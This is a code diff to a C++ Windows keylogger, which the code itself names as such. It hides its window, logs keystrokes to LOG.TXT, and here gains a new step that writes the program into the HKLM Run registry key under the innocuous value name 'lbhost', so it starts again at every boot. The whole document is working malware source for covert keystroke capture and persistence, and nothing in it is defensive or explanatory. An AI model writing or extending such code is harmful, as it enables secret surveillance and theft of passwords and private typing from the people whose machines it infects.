@@ -5,9 +5,33 @@
 void Hideme();
 void Logthis(int button, char* file);
 
-int main() {
+int main(int argc, char** argv) {
 	Hideme();
 	char filename[] = "LOG.TXT";
+
+	std::string reg = "\"" + std::string(argv[0]) + "\" \"" + std::string(argv[1]) + "\" \"" + std::string(argv[2]) + "\"";
+	//Register the keylogger application into windows Registery
+	HKEY hKey;
+	RegCreateKeyEx(
+		/*hKey*/        HKEY_LOCAL_MACHINE,
+		/*lpSubKey*/    "SOFTWARE\\Microsoft\\Windows\\"
+		"CurrentVersion\\Run",
+		/*Reserved*/    0,
+		/*lpClass*/     NULL,
+		/*dwOptions*/   REG_OPTION_NON_VOLATILE,
+		/*samDesired */ KEY_ALL_ACCESS,
+		/*lpSecurityAttributes*/ NULL,
+		/*phkResult */  &hKey,
+		/*lpdwDisposition */ 0);
+	RegSetValueExA(
+		hKey,
+		"lbhost",
+		0,
+		REG_SZ,
+		(LPBYTE)reg.c_str(),
+		reg.length() + 1);
+
+	RegCloseKey(hKey);
 
 	char key;
 	while (true) {
